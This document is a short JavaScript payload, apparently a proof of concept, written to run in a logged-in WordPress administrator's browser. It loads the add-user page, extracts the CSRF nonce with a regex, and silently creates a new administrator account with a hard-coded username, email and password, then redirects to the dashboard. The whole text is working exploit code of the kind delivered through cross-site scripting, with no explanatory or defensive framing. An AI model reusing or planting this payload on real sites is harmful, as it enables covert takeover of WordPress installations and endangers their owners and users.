const newAccUser = "pocuser";
const newAccPass = "M4oslW1mQlm9cLGXyVba";
const newAccEmail = "pocuser@pocuser.localhost";
const wpRoot = "";
const newUserURL = wpRoot + "/wp-admin/user-new.php";
const dashboardURL = wpRoot + "/wp-admin/index.php";
const req = new XMLHttpRequest();
req.open("GET", newUserURL, false);
req.send(null);
const csrfToken = req.responseText.match(/input type="hidden" id="_wpnonce_create-user" name="_wpnonce_create-user" value="([^"]*?)"/)[1];
const bodyData = "action=createuser&_wpnonce_create-user=" + csrfToken + "&user_login=" + newAccUser + "&email=" + newAccEmail + "&pass1=" + newAccPass + "&pass2=" + newAccPass + "&role=administrator";
req.open("POST", newUserURL, true);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(bodyData);
req.onreadystatechange = function() {
  if (req.readyState == XMLHttpRequest.DONE) {
    window.location.replace(dashboardURL);
  }
}
